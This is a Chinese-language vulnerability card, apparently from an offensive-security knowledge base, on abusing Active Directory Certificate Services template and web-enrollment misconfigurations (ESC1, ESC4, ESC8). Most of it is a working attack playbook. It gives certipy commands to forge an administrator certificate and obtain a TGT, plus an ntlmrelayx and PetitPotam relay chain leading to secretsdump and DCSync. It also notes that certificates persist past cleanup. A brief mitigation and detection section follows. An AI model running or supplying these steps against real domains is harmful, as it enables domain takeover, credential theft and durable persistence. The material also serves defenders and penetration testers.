---
title: AD CS 证书滥用（ESC1 / ESC8 等）
cve: 无单一 CVE（Certified Pre-Owned）
severity: critical
cvss: 8.8
product: Active Directory Certificate Services
versions: 任意 AD CS 部署（配置缺陷）
ports: 80, 443, 135, 445
keywords: adcs, esc1, esc8, certipy, pki, certificate-template
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

- `certipy find -u user@domain -p pass -dc-ip DC` 输出里出现 `[!] Vulnerabilities`。
- `http://<CA>/certsrv/` 可达（ESC8 的中继目标）。

## 前置条件

- 有域账号（ESC1 只需能申请证书）；ESC8 需要能触发机器账号认证（PrinterBug/PetitPotam）。
- CA 上存在允许「请求者提供 subject」或「任意用途」的模板。

## PoC

```bash
# 1) 枚举
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout

# 2) ESC1：用可控 subject 的模板申请管理员证书
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# 3) 用证书换 TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

## 利用步骤

1. `certipy find` 找 ESC1（`EnrolleeSuppliesSubject`）、ESC8（`Web Enrollment` + NTLM）、ESC3（注册代理）、ESC4（模板 ACL 可写）。
2. ESC1：申请 `-upn administrator@domain` 的证书 → `certipy auth` 拿 TGT → `secretsdump -k`。
3. ESC8：`ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` + `PetitPotam.py CA$@DC`，中继机器账号拿 DC 证书 → `certipy auth -pfx dc.pfx` → DCSync。
4. ESC4：模板 ACL 可写时先改模板成 ESC1 形态，再按 2 打。
5. 持久化注意：证书有效期通常 1 年，且吊销列表（CRL）不一定被检查——这是它比票据更稳的原因，也是清理时最容易漏的东西。

## 修复与缓解

- 模板去掉 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`；限制谁可注册/写模板 ACL；CA 开启 EPA + 关闭 NTLM 的 Web Enrollment。
- 检测：`certipy` 类工具会在 CA 上留下 4886/4887 事件与异常 `Request ID`。

## 参考

- SpecterOps《Certified Pre-Owned》；certipy 文档。
